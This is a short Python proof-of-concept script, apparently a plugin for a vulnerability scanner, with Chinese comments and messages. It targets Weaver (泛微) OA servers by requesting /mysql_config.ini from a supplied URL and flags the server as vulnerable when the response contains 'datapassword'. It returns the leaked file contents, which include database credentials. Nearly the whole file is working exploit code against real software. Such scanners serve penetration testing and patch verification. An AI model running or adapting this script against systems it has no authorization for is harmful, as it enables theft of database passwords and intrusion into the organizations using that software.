#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA 数据库配置泄露
referer: http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-087500
author: Lucifer
description: mysql_config.ini泄露。
'''
import sys
import requests
import warnings
from termcolor import cprint

class weaver_oa_db_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/mysql_config.ini"
        vulnurl = self.url + payload

        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"datapassword" in req.text:
                cprint("[+]存在泛微OA 数据库配置泄露漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "泛微OA 数据库配置泄露", str(payload), req.text
            else:
                cprint("[-]不存在weaver_oa_db_disclosure漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weaver_oa_db_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()